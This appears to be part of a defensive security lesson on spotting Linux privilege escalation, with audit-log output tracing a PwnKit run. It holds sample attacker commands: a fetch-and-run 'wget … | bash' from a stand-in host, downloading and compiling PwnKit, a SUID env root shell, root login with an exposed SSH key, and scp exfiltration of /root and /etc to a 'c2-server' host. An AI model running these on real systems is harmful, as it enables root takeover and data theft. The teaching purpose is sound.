| Preceding Discovery (IF)                                              | Privilege Escalation (THEN)                                                   |
| --------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| The `uname -a` shows an old, unpatched Ubuntu 16.04                   | Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh \| bash`           |
| The `find /bin -perm 4000` detects an `env` binary with the SUID flag | Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p`        |
| The `ls /etc/ssh` exposed an unprotected `ssh-backup-key` file        | Try using the file to get root access: `ssh root@127.0.0.1 -i ssh-backup-key` |

```bash
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```

```shell-session
# The PwnKit was launched by serviceuser (Look at the UID field)

root@thm-vm:~$ ausearch -i -x pwnkit 
type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit
type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec

# The PwnKit spawned a root shell (Look at the UID field)

root@thm-vm:~$ ausearch -i --ppid 24304 
type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash
type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec

# The threat actor continues the attack as root user

root@thm-vm:~$ ausearch -i --ppid 24310 
type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami
type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec
```